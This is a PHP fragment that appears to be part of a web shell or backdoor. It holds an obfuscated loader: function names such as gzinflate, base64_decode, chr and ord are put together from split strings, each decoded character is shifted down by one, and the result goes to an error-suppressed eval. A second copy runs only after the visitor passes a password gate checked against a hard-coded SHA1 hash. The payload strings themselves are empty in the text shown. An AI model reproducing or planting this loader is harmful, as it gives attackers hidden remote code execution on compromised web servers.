...
//ewe
function memek($kontol) {
    $gflate = 'g'.'zi'.'nf'.'la'.'te';
    $b64 = 'ba'.'se'.'64_'.'de'.'co'.'de';
    $nelrts = 'st'.'rl'.'en';
    $rhc = 'c'.'h'.'r';
    $dro = 'o'.'r'.'d';
    $kontol=$gflate($b64($kontol));
    for($i=0;$i<$nelrts($kontol);$i++)
{
    $kontol[$i] = $rhc($dro($kontol[$i])-1);
}
    return $kontol;
}
/***#***/@/*55555*/eval/***#***/(memek(""));
//end ewe
...
/*Login Page*/
//login
$passwd = '399d4f2638364355a8b45836acbe3f38c85fe533';
...
if (isset($_POST['gasken'])) {
    if (SHA1($_POST['passnya']) == $passwd) {
        //ewe
        function kontol($memek) {
            $gflate = 'g'.'zi'.'nf'.'la'.'te';
            $b64 = 'ba'.'se'.'64_'.'de'.'co'.'de';
            $nelrts = 'st'.'rl'.'en';
            $rhc = 'c'.'h'.'r';
            $dro = 'o'.'r'.'d';
            $memek=$gflate($b64($memek));
            for($i=0;$i<$nelrts($memek);$i++)
        {
            $memek[$i] = $rhc($dro($memek[$i])-1);
        }
            return $memek;
        }
        /***#***/@/*55555*/eval/***#***/(kontol(""));
        //ewe
